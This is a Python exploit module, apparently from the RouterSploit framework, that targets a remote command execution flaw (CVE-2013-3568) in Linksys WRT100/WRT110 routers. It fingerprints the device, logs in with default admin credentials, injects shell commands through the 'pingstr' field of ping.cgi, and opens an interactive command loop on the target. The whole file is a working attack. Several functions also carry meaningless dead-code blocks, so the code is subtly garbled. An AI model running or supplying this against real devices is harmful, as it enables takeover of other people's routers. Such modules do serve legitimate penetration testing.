from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Linksys WRT100/WRT110 RCE', 'description': 'Module exploits remote command execution in Linksys WRT100/WRT110 devices. If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.', 'authors': ('Craig Young', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3568', 'http://seclists.org/bugtraq/2013/Jul/78'), 'devices': ('Linksys WRT100', 'Linksys WRT110')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    username = OptString('admin', 'Username to log in')
    password = OptString('admin', 'Password to log in')

    def run(self):
        if False:
            while True:
                i = 10
        if self.check():
            print_success('Target appears to be vulnerable')
            if self.test_auth():
                print_status('Invoking command loop...')
                print_status('This is blind command injection. Response is not available.')
                shell(self, architecture='mipsle')
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        if False:
            for i in range(10):
                print('nop')
        payload = '& {}'.format(cmd)
        data = {'pingstr': payload}
        self.http_request(method='POST', path='/ping.cgi', data=data, auth=(self.username, self.password))
        return ''

    @mute
    def check(self):
        if False:
            while True:
                i = 10
        response = self.http_request(method='GET', path='/HNAP1/')
        if response is not None and '<ModelName>WRT110</ModelName>' in response.text:
            return True
        return False

    def test_auth(self):
        if False:
            for i in range(10):
                print('nop')
        print_status('Trying to authenticate')
        response = self.http_request(method='GET', path='/', auth=(self.username, self.password))
        if response is None or response.status_code == 401 or response.status_code == 404:
            print_error('Could not authenticate {}:{}'.format(self.username, self.password))
            return False
        else:
            print_success('Successful authentication {}:{}'.format(self.username, self.password))
            return True